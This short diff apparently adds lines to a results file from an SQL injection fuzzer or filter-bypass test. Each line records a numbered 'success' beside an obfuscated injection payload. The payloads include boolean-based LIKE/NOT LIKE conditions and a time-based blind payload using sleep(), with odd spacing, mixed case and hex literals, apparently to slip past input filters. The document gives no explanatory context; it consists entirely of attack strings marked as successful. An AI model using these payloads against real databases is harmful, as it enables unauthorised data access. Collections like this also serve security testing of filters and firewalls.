@@ -1,0 +1,4 @@
+7 success "1'\xa0WHere '\r' NOT LIKE '\rv' "
+19 success "(SELECT 1)'+  (  select dpkp where 4836  =  4836 and sleep  (  0x5   )    )   +' "
+36 success '(SELECT 1)" where \'-)pm\' NOT LIKE \'-)pm^\' '
+42 success "0x1'||  (  select 'svnn' From dual WherE 0x2206   LIKE\n  0x2206\t"
